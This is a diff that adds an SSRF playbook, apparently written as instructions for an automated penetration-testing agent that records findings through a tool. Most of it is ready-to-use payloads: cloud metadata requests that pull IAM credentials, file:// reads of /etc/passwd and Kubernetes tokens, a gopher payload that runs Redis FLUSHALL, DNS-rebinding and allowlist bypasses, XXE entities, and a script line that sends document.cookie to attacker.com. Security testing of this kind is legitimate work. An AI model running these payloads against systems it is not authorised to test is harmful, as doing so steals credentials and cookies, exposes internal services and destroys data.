@@ -1,0 +1,270 @@
+SCOPE: Server-Side Request Forgery — identify all injection points where user-controlled URLs or hostnames cause the server to make outbound requests, then pivot to cloud metadata, internal services, and blind OOB exfiltration.
+
+## TARGETS
+
+- URL parameters: `?url=`, `?callback=`, `?webhook=`, `?endpoint=`, `?target=`, `?host=`, `?redirect=`, `?next=`, `?image=`, `?icon=`, `?src=`, `?feed=`, `?link=`, `?fetch=`, `?resource=`, `?proxy=`, `?uri=`, `?path=`
+- API request body fields: `{"url":"..."}`, `{"webhook_url":"..."}`, `{"avatar_url":"..."}`, `{"logo_url":"..."}`, `{"callback":"..."}`
+- File import/upload by URL: "Import from URL", "Fetch from link", "Load remote asset"
+- PDF/HTML/screenshot rendering services: headless browser endpoints
+- SVG file upload (SVG can reference external URIs)
+- Excel/CSV import with external data source links
+- XML upload (XXE → SSRF)
+- Header-based: `X-Forwarded-For`, `X-Real-IP`, `Host`, `Referer` when used for server-side lookups
+- GraphQL arguments containing URLs
+- OpenGraph/oEmbed preview fetchers
+
+## TECHNIQUES
+
+1. **Cloud instance metadata endpoints (IMDSv1 — highest priority)**
+   Always try metadata endpoints first. IMDSv1 is unauthenticated and returns credentials. Confirm SSRF works at all with a benign destination, then escalate.
+
+   ```
+   # AWS IMDSv1:
+   ?url=http://169.254.169.254/latest/meta-data/
+   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+
+   # Response reveals: AccessKeyId, SecretAccessKey, Token (rotates every ~6h)
+   {"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
+
+   # GCP metadata:
+   ?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+   # Requires header: Metadata-Flavor: Google (some servers forward custom headers)
+
+   # Azure IMDS:
+   ?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+   # Requires header: Metadata: true
+
+   # Oracle Cloud:
+   ?url=http://169.254.169.254/opc/v1/instance/
+
+   # Alibaba Cloud:
+   ?url=http://100.100.100.200/latest/meta-data/
+   ```
+
+2. **Localhost and loopback address variations**
+   When the target sanitizes `127.0.0.1` and `localhost`, try the full set of equivalent representations.
+
+   ```
+   # IPv4 standard and dotted-decimal variants:
+   http://127.0.0.1/
+   http://127.1/
+   http://127.0.1/
+   http://0.0.0.0/           (loopback on Linux)
+   http://0/                 (loopback short form)
+
+   # Decimal integer form:
+   http://2130706433/        (127.0.0.1 as uint32)
+   http://0x7f000001/        (hex)
+   http://0177.0.0.1/        (octal first octet)
+   http://0x7f.0x0.0x0.0x1/  (all octets hex)
+
+   # IPv6:
+   http://[::1]/
+   http://[0:0:0:0:0:0:0:1]/
+   http://[::ffff:127.0.0.1]/  (IPv4-mapped IPv6)
+
+   # Alternate representations:
+   http://localhost/
+   http://LOCALHOST/
+   http://localtest.me/       (DNS resolves to 127.0.0.1)
+   http://spoofed.burpcollaborator.net/  (DNS resolves to 127.0.0.1)
+   http://127.0.0.1.nip.io/  (wildcard DNS → 127.0.0.1)
+   ```
+
+3. **Schema confusion (non-HTTP protocols)**
+   If the server uses a generic URL fetcher (libcurl, Python requests, Java HttpClient) that follows URI schemes, non-HTTP schemes may be interpreted by the underlying library.
+
+   ```
+   # File read:
+   ?url=file:///etc/passwd
+   ?url=file:///proc/self/environ
+   ?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
+
+   # Gopher (pre-HTTP protocol, can send arbitrary TCP bytes):
+   ?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A  (Redis FLUSHALL)
+   ?url=gopher://127.0.0.1:25/xHELO%20localhost%0AMAIL%20FROM...       (SMTP relay)
+
+   # Dict (TCP port probe + banner grab):
+   ?url=dict://127.0.0.1:6379/info    (Redis INFO banner)
+   ?url=dict://127.0.0.1:11211/stats  (Memcached stats)
+
+   # LDAP:
+   ?url=ldap://attacker.com:389/o=example
+
+   # FTP:
+   ?url=ftp://internal.corp/etc/passwd
+   ```
+
+4. **DNS rebinding**
+   The server validates the hostname at request time (resolves to an allowed IP), but the HTTP request is made after a short delay. If the attacker's DNS TTL is 0, they can change the IP between validation and the request — the request hits the internal target.
+
+   Setup: use a DNS rebinding service (rebind.it, rbndr.us) or run your own:
+   - Register `rebind.attacker.com` with a DNS record that alternates between your external IP (passes validation) and 169.254.169.254 (target for SSRF)
+   - TTL = 0
+
+   ```
+   ?url=http://rebind.attacker.com/latest/meta-data/
+   # First DNS resolution → external IP (validation passes)
+   # Second DNS resolution (during HTTP request) → 169.254.169.254 (SSRF lands on metadata)
+   ```
+
+5. **Redirect-chain SSRF**
+   If the server follows HTTP redirects from an allowed origin, host a redirect on an allowlisted domain that points to an internal target.
+
+   ```
+   # Attacker controls https://allowed-origin.attacker.com
+   # Hosts a redirect:
+   HTTP/1.1 301 Moved Permanently
+   Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+   # Victim request:
+   ?url=https://allowed-origin.attacker.com/redirect
+
+   # Server follows redirect to metadata endpoint
+   ```
+
+   Also use open redirects on trusted domains: `?url=https://trusted-partner.com/redirect?target=http://169.254.169.254/`
+
+6. **Blind SSRF — OOB DNS and HTTP exfiltration**
+   When responses are not reflected (blind SSRF), detect via out-of-band DNS lookups and HTTP callbacks. Use Burp Collaborator, interactsh, or canarytokens.
+
+   ```
+   # DNS-based detection:
+   ?url=http://<unique-id>.oastify.com/
+   # Monitor DNS query for <unique-id>.oastify.com → SSRF confirmed
+
+   # HTTP-based (receives full headers and any response content):
+   ?url=https://<unique-id>.oastify.com/path
+
+   # Timing-based internal port scan (measure response time difference):
+   ?url=http://127.0.0.1:22/     (SSH: fast connection, slow response = port open)
+   ?url=http://127.0.0.1:9999/   (closed: immediate TCP RST = port closed)
+   ```
+
+   Escalate from blind SSRF: once OOB confirms SSRF, try schema confusion (`file://`, `gopher://`) or metadata endpoints and use the OOB host to receive the response via a redirect chain.
+
+7. **Internal port scan and service banner grab via SSRF**
+   Map internal network topology by iterating ports on localhost and known internal IP ranges. Response timing, error messages, or Content-Type headers reveal open ports and service types.
+
+   ```
+   # Port scan via timing (blind SSRF):
+   Ports to always probe: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 5432 (Postgres),
+   6379 (Redis), 11211 (Memcached), 8080 (HTTP alt), 8443 (HTTPS alt), 9200 (Elasticsearch),
+   2379 (etcd), 8500 (Consul), 4001 (etcd old), 5601 (Kibana), 9090 (Prometheus),
+   3000 (Grafana/Dev), 8888 (Jupyter), 27017 (MongoDB), 5984 (CouchDB)
+
+   # Elasticsearch unauthenticated (if port 9200 open):
+   ?url=http://127.0.0.1:9200/_cat/indices
+   ?url=http://127.0.0.1:9200/<index-name>/_search
+
+   # Redis (gopher for write, dict for read):
+   ?url=dict://127.0.0.1:6379/info
+   ```
+
+8. **PDF / SVG / screenshot renderer SSRF**
+   Server-side PDF generators (wkhtmltopdf, Puppeteer, PhantomJS, WeasyPrint) fetch embedded URLs. SVG files processed server-side can include `<image href="http://...">` or `<use href="http://...">`. HTML-to-image converters hit any URL in the page.
+
+   ```
+   # SVG payload (upload as avatar or logo):
+   <svg xmlns="http://www.w3.org/2000/svg">
+     <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100" height="100"/>
+   </svg>
+
+   # PDF with embedded iframe (wkhtmltopdf):
+   <iframe src="file:///etc/passwd" width="800" height="600"></iframe>
+   <script>document.write('<img src="http://attacker.com/?x='+document.cookie+'"/>')</script>
+
+   # Excel with external data link (DDE or external reference):
+   =WEBSERVICE("http://169.254.169.254/latest/meta-data/")
+   ```
+
+9. **Webhook URL whitelist bypass**
+   Webhook configuration endpoints accept callback URLs and validate them against an allowlist. Common bypass techniques:
+
+   ```
+   # Subdomain of allowed domain (if wildcard match):
+   https://169.254.169.254.allowed-domain.com/   (DNS resolves to 169.254.169.254)
+
+   # URL confusion with @ sign:
+   https://allowed-domain.com@169.254.169.254/
+
+   # Fragment confusion (some parsers read host from before #):
+   https://169.254.169.254/#.allowed-domain.com/
+
+   # IPv6 bypass:
+   http://[::ffff:169.254.169.254]/latest/meta-data/
+
+   # URL shortener (if allowed, resolve to internal target):
+   https://bit.ly/<your-shortlink-pointing-to-169.254.169.254>
+   ```
+
+10. **Range header reflection and partial content SSRF**
+    Some SSRF primitives only return partial responses. Use the `Range` HTTP header to request specific byte ranges and exfiltrate content chunk by chunk. Also useful when the response is truncated by the server.
+
+    ```
+    ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+    + Range: bytes=0-100   (in the outbound request if the server forwards headers)
+    ```
+
+    Alternatively, exfiltrate via DNS by encoding response content in subdomain labels:
+    ```
+    # Blind exfil: Server fetches http://attacker.com/<base64-encoded-response-chunk>
+    # → DNS query to attacker.com logs the chunk
+    ```
+
+11. **XXE → SSRF**
+    XML processing (SOAP, SVG, DOCX/XLSX, configuration import) with external entity support can pivot to SSRF.
+
+    ```
+    POST /api/import
+    Content-Type: application/xml
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+    ]>
+    <import><data>&xxe;</data></import>
+
+    200 OK → {"imported":{"data":"role-name\n"}}   ← SSRF via XXE confirmed
+    ```
+
+    Also try parameter entity for blind XXE → SSRF:
+    ```
+    <!DOCTYPE foo [
+      <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+      %xxe;
+    ]>
+    ```
+
+12. **SSRF via Host header and X-Forwarded-Host**
+    Some applications use the `Host` header or `X-Forwarded-Host` to construct URLs for internal service calls (password reset links, email verification links, webhook destinations, microservice routing).
+
+    ```
+    POST /auth/reset-password
+    Host: 169.254.169.254
+    Content-Type: application/json
+    {"email":"victim@example.com"}
+
+    # If server sends reset link to: http://169.254.169.254/reset?token=...
+    # or makes internal call to Host header value → SSRF
+
+    # X-Forwarded-Host variant:
+    POST /auth/reset-password
+    Host: app.example.com
+    X-Forwarded-Host: 169.254.169.254
+    ```
+
+    Also test `X-Forwarded-For` values if the app uses them for outbound service routing in load balancer configurations.
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: e.g. "SSRF via ?url= parameter reaches AWS IMDS — IAM credentials exposed", "Blind SSRF confirmed via OOB DNS on webhook endpoint"
+- `severity`: `critical` (cloud credentials obtained, internal service RCE possible), `high` (internal network reachable, sensitive internal API accessible), `medium` (blind SSRF confirmed, port scan possible), `low` (SSRF to external services only, no internal reach)
+- `url`: the vulnerable endpoint URL
+- `method`: HTTP method
+- `request_params`: the parameter and value used to trigger SSRF (include the injected URL)
+- `response_body_excerpt`: if reflected — the internal response content (first 500 bytes); if blind — the OOB callback evidence (Collaborator interaction ID or DNS query timestamp)
+- `evidence_notes`: specify which SSRF class (reflected, blind, via redirect, via XXE), what internal target was reached, and the blast radius (e.g., "EC2 role credentials allow s3:GetObject on all buckets")
+- `cwe`: CWE-918 (Server-Side Request Forgery); CWE-611 (XXE when via XML); CWE-601 (Open Redirect as SSRF amplifier)
